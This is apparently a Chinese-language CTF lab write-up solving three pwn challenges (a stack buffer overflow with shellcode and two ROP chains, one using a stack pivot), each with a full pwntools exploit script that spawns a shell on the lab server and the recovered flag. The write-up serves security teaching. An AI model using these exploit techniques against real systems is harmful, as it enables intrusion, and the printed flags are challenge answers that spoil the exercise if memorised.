## 栈上缓冲区溢出

发现危险函数gets()，我们利用这个函数将返回地址覆盖到shellcode即可。

![image-20241022231528002](https://s2.loli.net/2024/10/22/DdrK4tCBJab5nwZ.png)

```python
from pwn import *

context.log_level = 'DEBUG' # set debug logging
context.arch = "amd64"

# p = process("./sbof2")

p = remote("8.154.20.109", 10100)
p.recvuntil(b"Please input your StudentID:\n")
p.sendline(b"3220103544")
p.recvuntil(b"gift address: ")
buffer_address = int(p.recvline().strip(), 16)

payload = b""
payload += b"a" * 0x108
payload += p64(buffer_address+0x110)
payload += asm(shellcraft.sh())


p.sendline(payload)
p.interactive()

```

![image-20241022213226484](https://s2.loli.net/2024/10/22/thzjkWVHy7JqwvB.png)

![image-20241022212628460](https://s2.loli.net/2024/10/22/dBOnqmfzjlvWT3H.png)

## Return-Oriented-Programming

### 1

首先，我们检查一下程序的安全保护，源程序为 64位，开启了 NX 保护。

![image-20241022225707311](https://s2.loli.net/2024/10/22/sz37DKVadpBclXw.png)

使用 IDA 反编译以确定漏洞位置：可以利用read函数栈溢出。

![image-20241022221437963](https://s2.loli.net/2024/10/22/TMSkeOjVsgu7PHq.png)

利用 ropgadget，我们可以看看有没有 '/bin/sh' ，'ret', 'pop rdi’ 等字符串或gadget存在，发现存在则记录地址。

![image-20241022223459755](https://s2.loli.net/2024/10/22/yUtkniVPbMZLHe5.png)

拿到了这些gadget，我们可以构造 payload

攻击代码如下：

```python
from pwn import *

context.log_level = 'DEBUG' # set debug logging
context.arch = 'amd64'
# p = process("./rop2")
p = remote("8.154.20.109", 10101)
binary = ELF("./rop2")
rop = ROP(binary)
p.recvuntil(b"Please input your StudentID:\n")
p.sendline(b"3220103544")

ret_addr = 0x00444a40
bin_sh_addr = 0x006d50f0
pop_rdi_addr = 0x00400716


payload = b''
payload += b"A" * 0x58
payload += p64(pop_rdi_addr) # pop rdi ; ret
payload += p64(bin_sh_addr) # @ .data
payload += p64(ret_addr)
payload += p64(binary.sym["system"])

p.sendlineafter(b"[*] Please input the length of data:\n", str(len(payload)))
p.sendlineafter(b"[*] Please input the data:\n", payload)

p.interactive()
```

![image-20241022223338875](https://s2.loli.net/2024/10/22/dN3H6hsB5imLECb.png)

拿到flag：ssec2023{r0p_bAs1c_biNarY|212ce834}



### 2

首先，我们检查一下程序的安全保护，源程序为 64位，开启了 NX 保护。

![image-20241022225656295](https://s2.loli.net/2024/10/22/agTt4Bb5vyYlRis.png)

利用 ropgadget，我们可以看看有没有 '/bin/sh' ，'ret', 'pop rdi’ 等字符串或gadget存在，发现存在则记录地址。但这题并没有包含"/bin/sh"等重要字符串，我们需要做栈迁移。将 rbp 覆盖为 gbuffer ， ret_addr 覆盖为 leave; ret , 把栈迁到 gbuffer 上。

![image-20241022225645412](https://s2.loli.net/2024/10/22/GJmHeZ13Ytd6QOV.png)

攻击代码如下：

```python
from pwn import *

context.log_level = 'DEBUG' # set debug logging
context.arch = 'amd64'
REMOTE = True
if REMOTE:
    p = remote('8.154.20.109', 10102)
else:
    p = process('./rop3')

binary = ELF("./rop2")
rop = ROP(binary)
p.recvuntil(b"Please input your StudentID:\n")
p.sendline(b"3220103544")
p.recvuntil(b"gift system address: ")

system_addr = int(p.recv(8).strip(), 16)
ret_addr = 0x00400586
pop_rdi_addr = 0x00400823
gbuffer = 0x006020A0
leave_ret=0x00400700

payload = b"A" * 8
payload += p64(pop_rdi_addr)
payload += p64(gbuffer + 5 * 8)
payload += p64(ret_addr)
payload += p64(system_addr)
payload += b"/bin/sh\x00"

p.sendlineafter(b"\n", payload)


payload = b""
payload += b"A" * 0x40
payload += p64(gbuffer)
payload += p64(leave_ret)
p.sendlineafter(b">", payload)


p.interactive()
```

![image-20241022230342659](https://s2.loli.net/2024/10/22/inJktZrVh8uT2HX.png)

flag: ssec2023{r0p_1RiVi4L_p1v0t|154e0f76}